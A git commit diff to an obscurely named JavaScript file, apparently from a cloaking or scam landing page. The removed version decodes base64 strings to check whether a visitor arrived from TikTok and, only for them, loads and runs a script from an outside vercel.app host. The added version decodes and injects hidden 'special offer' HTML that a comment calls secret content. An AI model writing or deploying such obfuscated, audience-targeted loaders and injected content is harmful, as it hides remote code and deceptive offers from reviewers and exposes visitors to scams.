7303f3ebb6e2e578b56a4416361a9d4386d69ca0
TKT007 <makosquad.ze@gmail.com>
2025-08-10 09:51:43 -0300

    Update x9j3c0p7s.js

--- x9j3c0p7s.js
+++ x9j3c0p7s.js
@@ -1,17 +1,7 @@
-<script>
 (function(){
     try {
-        var q = new URLSearchParams(window.location.search);
-        var v = q.get('source');
-        if (!v || v.toLowerCase() !== atob('dGlrdG9r')) return;
-
-        var d = atob('aHR0cHM6Ly9keW5hbWljLWxhYy52ZXJjZWwuYXBw');
-        var p = '/x9j3c0p7s.js';
-        var s = document.createElement('script');
-        s.src = d + p;
-        s.async = true;
-        s.onerror = function(){};
-        document.head.appendChild(s);
+        // Conteúdo secreto ou manipulação de DOM aqui
+        var c = atob('PGRpdiBzdHlsZT0iYmFja2dyb3VuZDogIzAwMDsgY29sb3I6ICNmZmY7IHBhZGRpbmc6IDMwcHg7Ij48aDE+T2ZlcnQgc3BlY2lhbDwvaDE+PHA+U29tZW5lbnRlIHRleHRvIHNlY3JldG8uPC9wPjwvZGl2Pg==');
+        document.body.insertAdjacentHTML('beforeend', c);
     } catch(e){}
 })();
-</script>
